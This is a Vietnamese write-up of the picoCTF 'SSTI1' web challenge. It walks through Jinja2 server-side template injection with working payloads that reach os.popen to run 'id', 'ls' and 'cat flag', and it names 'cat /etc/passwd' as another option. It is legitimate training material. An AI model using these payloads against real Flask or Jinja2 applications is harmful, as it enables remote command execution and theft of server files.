<img width="1841" height="907" alt="image" src="https://github.com/user-attachments/assets/d2454490-c7e5-4828-a062-e0c00be2c179" />

Link picoctf_SSTI1 : http://rescued-float.picoctf.net:57497/

Theo đề bài và những lần thử ghi nội dung và gửi đi . Mình có thể thấy được rằng , mình có thể ghi bất cứ cái gì để nó print ra . Vậy thử suy nghĩ rằng , liệu nó có thể in ra câu lệnh hay thực thi câu lệnh của chúng ta hay không . 
Đó là lý do tại sao ta nên thử thêm nội dung với những câu lệnh để xem liệu có thể mở ra cái gì đó hay ho từ đoạn mã lệnh của chúng ta hay không .

Chúng ta thử với mẫu sau : {{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

Phân tích chi tiết từng thành phần

{{ ... }}: Đây là cú pháp biểu thức của template engine (như Jinja2). Nó báo cho máy chủ biết rằng nội dung bên trong cần được đánh giá (evaluate) như một đoạn mã Python và kết quả sẽ được in ra trang web.

request: Đây là đối tượng đại diện cho HTTP request hiện tại do người dùng gửi lên. Trong môi trường Flask, đối tượng này thường được cung cấp sẵn bên trong template.

.application: Truy cập vào đối tượng ứng dụng gốc (WSGI application) đang chạy.

.__globals__: Truy cập vào từ điển chứa tất cả các biến toàn cục (global variables) của module đang chứa ứng dụng.

.__builtins__: Đây là bước "thoát ngục" (sandbox escape) quan trọng. Nó cho phép truy cập vào các hàm tích hợp sẵn của Python (built-in functions) mà bình thường template engine cố gắng ẩn đi để bảo mật, chẳng hạn như hàm __import__, eval, open.

.__import__('os'): Sử dụng hàm built-in vừa lấy được để nạp (import) thư viện os của Python. Thư viện này chứa các hàm dùng để tương tác trực tiếp với hệ điều hành của máy chủ.

.popen('id'): Gọi hàm popen từ thư viện os để mở một tiến trình và chạy lệnh shell là id. Trong hệ điều hành Linux/Unix, lệnh id được dùng để xem thông tin về người dùng (UID, GID) đang thực thi tiến trình đó. (Kẻ tấn công có thể thay thế id bằng bất kỳ lệnh nguy hiểm nào khác như ls, cat /etc/passwd, v.v.).

.read(): Đọc kết quả đầu ra (output) của lệnh id vừa chạy, để nó được hiển thị lên trang web thông qua cú pháp {{ ... }}.

Sau khi click 'OK' , chúng ta co thể thấy rằng , khi nhập lệnh và gửi đi , những id của root đã lộ ra để chúng ta thấy : uid=0(root) gid=0(root) groups=0(root)
Điều này chứng tỏ , chúng ta hoàn toàn có thể leo và sử dụng quyền root  ngay cả khi không attack vào máy chủ hệ thống .  \

<img width="1598" height="461" alt="image" src="https://github.com/user-attachments/assets/857b7488-e92a-46ad-bc06-d6eadbb476b6" />

Chúng ta có thể leo root với lệnh popen('id') , vậy thì chúng ta hãy thử với popen('ls') để xem có thể mở hay xem được những thứ hay ho mà chúng ta cần tìm hay không . Chúng ta sử dụng nội dung mã lệnh sau :

{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}

<img width="1674" height="797" alt="image" src="https://github.com/user-attachments/assets/4c079206-7147-4b12-a756-7e948c485f07" />

Khi thay bằng popen('ls') , những nội dung file tệp bên trong đã bị lộ ra để người dùng như chúng ta có thể theo dõi : __pycache__ app.py flag requirements.txt 

Hãy thử tưởng tượng , miếng mồi ngon đang ở trước mặt , việc chúng ta cần làm tiếp theo là mở ra lấy nội dung . Xét thấy có nhiều file , ta sẽ chọn file " Flag" vì chúng đã mang trong mình cái tên mà chúng ta cần tìm ( dĩ nhiên , nếu không hiển thị ra flag thật thì chúng ta sẽ mở các file còn lại để tìm flag )
Chúng ta sử dụng đoạn mã lệnh sau :

{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
Thật hạnh phúc , sau những thao tác mà chúng ta đã làm , một đoạn flag đã hiển thị ngay trước mắt . 

<img width="1661" height="438" alt="image" src="https://github.com/user-attachments/assets/6a3bc5d8-c492-4084-99d0-dbda30391497" />

Nó quá to với khung hình không ? Bạn có ít nhất 3 cách cơ bản để nhìn thây và sao lưu nó .  Ví dụ :
(+) Cách 1 : Ctrl+A + Ctrl+C để copy toàn bộ flag 
(+) Cách 2 : thu nhỏ màn hình lại từ việc click vào dấu 3 chấm trên màn hình để chọn thu phóng nhỏ xuống để thấy rõ được lệnh rồi copy
(+) Cách 3 : Ctrl+U để xem nguồn trang và copy từ đoạn HTML đó 

Flag có dạng như sau :

picoCTF{s4*****\_s****\_*********\_1nj*****5\_4****\_c****\********}

Mọi người có thể xem video tôi trình bày theo đường link sau :https://www.tiktok.com/@wrvn26/video/7579312021112507665

Cảm ơn tất cả mọi người đã dành thời gian để đọc bài viết của tôi. Wish you have all the best .
